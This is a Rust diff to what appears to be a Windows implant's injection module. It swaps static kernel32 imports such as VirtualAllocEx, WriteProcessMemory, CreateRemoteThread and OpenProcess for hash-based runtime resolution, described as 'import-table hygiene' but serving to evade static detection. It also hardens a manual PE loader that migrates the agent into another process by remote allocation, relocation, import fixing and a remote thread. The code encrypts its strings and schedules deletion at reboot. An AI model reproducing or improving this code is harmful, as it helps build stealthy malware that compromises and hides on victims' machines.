@@ -84,11 +84,15 @@ pub mod windows {
                 n_file_index_low: u32,
             }
 
-            extern "system" {
-                fn GetFileInformationByHandle(
-                    h: *mut std::ffi::c_void,
-                    info: *mut ByHandleFileInformation,
-                ) -> i32;
+            /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+            unsafe fn GetFileInformationByHandle( h: *mut std::ffi::c_void, info: *mut ByHandleFileInformation, ) -> i32 {
+                type F = unsafe extern "system" fn(*mut std::ffi::c_void, *mut ByHandleFileInformation) -> i32;
+                static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+                let p = *P.get_or_init(||
+                    crate::agent::injection::win_resolve::resolve_ptr(
+                        b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetFileInformationByHandle")));
+                let f: F = unsafe { std::mem::transmute(p) };
+                unsafe { f(h, info) }
             }
 
             let f = std::fs::File::open(path).ok()?;
@@ -178,22 +182,105 @@ pub mod windows {
         }
     }
 
-    extern "system" {
-        fn CreateProcessA(
-            app: *const i8, cmd: *mut i8, proc_attr: *mut c_void,
-            thread_attr: *mut c_void, inherit: i32, flags: u32,
-            env: *mut c_void, dir: *mut c_void,
-            si: *mut STARTUPINFOA, pi: *mut PROCESS_INFORMATION,
-        ) -> i32;
-        fn VirtualAllocEx(proc: *mut c_void, addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void;
-        fn WriteProcessMemory(proc: *mut c_void, addr: *mut c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32;
-        fn ReadProcessMemory(proc: *mut c_void, addr: *const c_void, buf: *mut c_void, size: usize, read: *mut usize) -> i32;
-        fn VirtualProtectEx(proc: *mut c_void, addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
-        fn CreateRemoteThread(proc: *mut c_void, attr: *mut c_void, stack: usize, start: *const c_void, param: *mut c_void, flags: u32, tid: *mut u32) -> *mut c_void;
-        fn CloseHandle(h: *mut c_void) -> i32;
-        fn ResumeThread(h: *mut c_void) -> u32;
-        fn GetLastError() -> u32;
-        fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateProcessA( app: *const i8, cmd: *mut i8, proc_attr: *mut c_void, thread_attr: *mut c_void, inherit: i32, flags: u32, env: *mut c_void, dir: *mut c_void, si: *mut STARTUPINFOA, pi: *mut PROCESS_INFORMATION, ) -> i32 {
+        type F = unsafe extern "system" fn(*const i8, *mut i8, *mut c_void, *mut c_void, i32, u32, *mut c_void, *mut c_void, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateProcessA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(app, cmd, proc_attr, thread_attr, inherit, flags, env, dir, si, pi) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualAllocEx(proc: *mut c_void, addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAllocEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(proc, addr, size, at, prot) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn WriteProcessMemory(proc: *mut c_void, addr: *mut c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WriteProcessMemory")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(proc, addr, buf, size, written) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ReadProcessMemory(proc: *mut c_void, addr: *const c_void, buf: *mut c_void, size: usize, read: *mut usize) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *const c_void, *mut c_void, usize, *mut usize) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReadProcessMemory")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(proc, addr, buf, size, read) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtectEx(proc: *mut c_void, addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtectEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(proc, addr, size, new, old) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateRemoteThread(proc: *mut c_void, attr: *mut c_void, stack: usize, start: *const c_void, param: *mut c_void, flags: u32, tid: *mut u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, *const c_void, *mut c_void, u32, *mut u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateRemoteThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(proc, attr, stack, start, param, flags, tid) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ResumeThread(h: *mut c_void) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ResumeThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetLastError() -> u32 {
+        type F = unsafe extern "system" fn() -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLastError")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void, u32) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WaitForSingleObject")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h, ms) }
     }
 
     #[repr(C)]
@@ -267,8 +354,15 @@ pub mod windows {
         // MoveFileExW to schedule reboot deletion.
         #[cfg(target_os = "windows")]
         {
-            extern "system" {
-                fn MoveFileExW(src: *const u16, dst: *const u16, flags: u32) -> i32;
+            /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+            unsafe fn MoveFileExW(src: *const u16, dst: *const u16, flags: u32) -> i32 {
+                type F = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
+                static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+                let p = *P.get_or_init(||
+                    crate::agent::injection::win_resolve::resolve_ptr(
+                        b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"MoveFileExW")));
+                let f: F = unsafe { std::mem::transmute(p) };
+                unsafe { f(src, dst, flags) }
             }
             // OS-fixed (winnt.h), not mirrored by the typed FFI config.
             const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x4;
@@ -305,8 +399,15 @@ pub mod windows {
 
     /// Inject the agent PE into an existing process.
     pub unsafe fn inject_migrate(pid: u32, pe_bytes: &[u8]) -> Result<String, String> {
-        extern "system" {
-            fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void {
+            type F = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcess")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(access, inherit, pid) }
         }
 
         let h_process = OpenProcess(
@@ -334,9 +435,36 @@ pub mod windows {
     ///   5. Resolve IAT (system DLLs share the same base across processes)
     ///   6. CreateRemoteThread at the PE entry point
     unsafe fn inject_pe_into_process(h_process: *mut c_void, pe_bytes: &[u8]) -> Result<(), String> {
-        extern "system" {
-            fn LoadLibraryA(name: *const i8) -> *mut c_void;
-            fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
+        // Little-endian reads that fail as handled errors instead of the
+        // slice-index/try_into().unwrap() panics this parser used to have;
+        // this runs on a task thread where a panic takes the agent down.
+        fn rd<const N: usize>(buf: &[u8], off: usize) -> Result<[u8; N], String> {
+            buf.get(off..off + N)
+                .map(|s| { let mut a = [0u8; N]; a.copy_from_slice(s); a })
+                .ok_or_else(|| aes_str!("PE parse: read out of bounds"))
+        }
+        fn rd_u16(buf: &[u8], off: usize) -> Result<u16, String> { Ok(u16::from_le_bytes(rd(buf, off)?)) }
+        fn rd_u32(buf: &[u8], off: usize) -> Result<u32, String> { Ok(u32::from_le_bytes(rd(buf, off)?)) }
+        fn rd_u64(buf: &[u8], off: usize) -> Result<u64, String> { Ok(u64::from_le_bytes(rd(buf, off)?)) }
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn LoadLibraryA(name: *const i8) -> *mut c_void {
+            type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(name) }
+        }
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void {
+            type F = unsafe extern "system" fn(*mut c_void, *const i8) -> *mut c_void;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(module, name) }
         }
 
         // Win32 allocation/protection flags from the typed FFI config
@@ -348,22 +476,22 @@ pub mod windows {
         // Parse DOS/NT headers
         let dos_magic = u16::from_le_bytes([pe_bytes[0], pe_bytes[1]]);
         if dos_magic != 0x5A4D { return Err(aes_str!("Invalid DOS header")); }
-        let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into().unwrap()) as usize;
+        let e_lfanew = rd_u32(pe_bytes, 0x3C)? as usize;
         if e_lfanew + 0x108 > pe_bytes.len() { return Err(aes_str!("NT header out of bounds")); }
 
-        let nt_sig = u32::from_le_bytes(pe_bytes[e_lfanew..e_lfanew+4].try_into().unwrap());
+        let nt_sig = rd_u32(pe_bytes, e_lfanew)?;
         if nt_sig != ffi.image_nt_signature { return Err(aes_str!("Invalid PE signature")); }
 
         // File header
         let fh = e_lfanew + 4;
-        let num_sections = u16::from_le_bytes(pe_bytes[fh+2..fh+4].try_into().unwrap()) as usize;
-        let opt_size = u16::from_le_bytes(pe_bytes[fh+16..fh+18].try_into().unwrap()) as usize;
+        let num_sections = rd_u16(pe_bytes, fh+2)? as usize;
+        let opt_size = rd_u16(pe_bytes, fh+16)? as usize;
         let oh = fh + 20; // optional header
 
-        let image_base = u64::from_le_bytes(pe_bytes[oh+24..oh+32].try_into().unwrap());
-        let size_of_image = u32::from_le_bytes(pe_bytes[oh+56..oh+60].try_into().unwrap()) as usize;
-        let entry_rva = u32::from_le_bytes(pe_bytes[oh+16..oh+20].try_into().unwrap()) as usize;
-        let size_of_headers = u32::from_le_bytes(pe_bytes[oh+60..oh+64].try_into().unwrap()) as usize;
+        let image_base = rd_u64(pe_bytes, oh+24)?;
+        let size_of_image = rd_u32(pe_bytes, oh+56)? as usize;
+        let entry_rva = rd_u32(pe_bytes, oh+16)? as usize;
+        let size_of_headers = rd_u32(pe_bytes, oh+60)? as usize;
 
         // Try preferred base, fall back to any address
         let mut remote_base = VirtualAllocEx(
@@ -392,9 +520,9 @@ pub mod windows {
         for i in 0..num_sections {
             let s = sections_off + i * 40;
             if s + 40 > pe_bytes.len() { break; }
-            let virt_addr = u32::from_le_bytes(pe_bytes[s+12..s+16].try_into().unwrap()) as usize;
-            let raw_size = u32::from_le_bytes(pe_bytes[s+16..s+20].try_into().unwrap()) as usize;
-            let raw_ptr = u32::from_le_bytes(pe_bytes[s+20..s+24].try_into().unwrap()) as usize;
+            let virt_addr = rd_u32(pe_bytes, s+12)? as usize;
+            let raw_size = rd_u32(pe_bytes, s+16)? as usize;
+            let raw_ptr = rd_u32(pe_bytes, s+20)? as usize;
             if raw_size == 0 || raw_ptr == 0 { continue; }
             let end = (raw_ptr + raw_size).min(pe_bytes.len());
             if raw_ptr >= pe_bytes.len() { continue; }
@@ -412,28 +540,28 @@ pub mod windows {
 
         // Apply base relocations if we didn't get the preferred base
         if delta != 0 {
-            let reloc_rva = u32::from_le_bytes(pe_bytes[oh+152..oh+156].try_into().unwrap()) as usize;
-            let reloc_size = u32::from_le_bytes(pe_bytes[oh+156..oh+160].try_into().unwrap()) as usize;
+            let reloc_rva = rd_u32(pe_bytes, oh+152)? as usize;
+            let reloc_size = rd_u32(pe_bytes, oh+156)? as usize;
             if reloc_rva != 0 && reloc_size != 0 {
                 let mut offset = reloc_rva;
                 while offset < reloc_rva + reloc_size {
                     if offset + 8 > image_copy.len() { break; }
-                    let page_rva = u32::from_le_bytes(image_copy[offset..offset+4].try_into().unwrap()) as usize;
-                    let block_sz = u32::from_le_bytes(image_copy[offset+4..offset+8].try_into().unwrap()) as usize;
+                    let page_rva = rd_u32(&image_copy, offset)? as usize;
+                    let block_sz = rd_u32(&image_copy, offset+4)? as usize;
                     if block_sz < 8 { break; }
 
                     let num_entries = (block_sz - 8) / 2;
                     for j in 0..num_entries {
                         let entry_off = offset + 8 + j * 2;
                         if entry_off + 2 > image_copy.len() { break; }
-                        let entry = u16::from_le_bytes(image_copy[entry_off..entry_off+2].try_into().unwrap());
+                        let entry = rd_u16(&image_copy, entry_off)?;
                         let reloc_type = (entry >> 12) & 0xF;
                         let reloc_offset = (entry & 0xFFF) as usize;
 
                         if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
                             let addr = page_rva + reloc_offset;
                             if addr + 8 <= image_copy.len() {
-                                let val = u64::from_le_bytes(image_copy[addr..addr+8].try_into().unwrap());
+                                let val = rd_u64(&image_copy, addr)?;
                                 let new_val = (val as i64 + delta) as u64;
                                 image_copy[addr..addr+8].copy_from_slice(&new_val.to_le_bytes());
                             }
@@ -452,34 +580,32 @@ pub mod windows {
         // System DLLs (kernel32, ntdll, etc.) are mapped at the same virtual
         // address in all processes, so we can resolve addresses in OUR process
         // and write them into the remote image.
-        let import_rva = u32::from_le_bytes(pe_bytes[oh+120..oh+124].try_into().unwrap()) as usize;
-        let import_size = u32::from_le_bytes(pe_bytes[oh+124..oh+128].try_into().unwrap()) as usize;
+        let import_rva = rd_u32(pe_bytes, oh+120)? as usize;
+        let import_size = rd_u32(pe_bytes, oh+124)? as usize;
         if import_rva != 0 && import_size != 0 {
             // Each import descriptor is 20 bytes
             let mut desc_off = import_rva;
             loop {
                 if desc_off + 20 > image_copy.len() { break; }
-                let name_rva = u32::from_le_bytes(image_copy[desc_off+12..desc_off+16].try_into().unwrap()) as usize;
+                let name_rva = rd_u32(&image_copy, desc_off+12)? as usize;
                 if name_rva == 0 { break; } // null terminator
 
-                let olt_rva = u32::from_le_bytes(image_copy[desc_off..desc_off+4].try_into().unwrap()) as usize;
-                let iat_rva = u32::from_le_bytes(image_copy[desc_off+16..desc_off+20].try_into().unwrap()) as usize;
+                let olt_rva = rd_u32(&image_copy, desc_off)? as usize;
+                let iat_rva = rd_u32(&image_copy, desc_off+16)? as usize;
                 let lookup_rva = if olt_rva != 0 { olt_rva } else { iat_rva };
 
                 // Read DLL name from image
                 if name_rva < image_copy.len() {
                     let name_end = image_copy[name_rva..].iter().position(|&b| b == 0).unwrap_or(0) + name_rva;
                     let dll_name = std::ffi::CString::new(&image_copy[name_rva..name_end])
-                        .unwrap_or_else(|_| std::ffi::CString::new("").unwrap());
+                        .unwrap_or_default();
                     let h_dll = LoadLibraryA(dll_name.as_ptr());
 
                     if !h_dll.is_null() {
                         let mut thunk_off = 0usize;
                         loop {
                             if lookup_rva + thunk_off + 8 > image_copy.len() { break; }
-                            let thunk = u64::from_le_bytes(
-                                image_copy[lookup_rva+thunk_off..lookup_rva+thunk_off+8].try_into().unwrap()
-                            );
+                            let thunk = rd_u64(&image_copy, lookup_rva + thunk_off)?;
                             if thunk == 0 { break; }
 
                             let func_addr = if thunk & (1u64 << 63) != 0 {
@@ -491,7 +617,7 @@ pub mod windows {
                                 if hint_rva < image_copy.len() {
                                     let fn_end = image_copy[hint_rva..].iter().position(|&b| b == 0).unwrap_or(0) + hint_rva;
                                     let fn_name = std::ffi::CString::new(&image_copy[hint_rva..fn_end])
-                                        .unwrap_or_else(|_| std::ffi::CString::new("").unwrap());
+                                        .unwrap_or_default();
                                     GetProcAddress(h_dll, fn_name.as_ptr())
                                 } else { ptr::null_mut() }
                             };
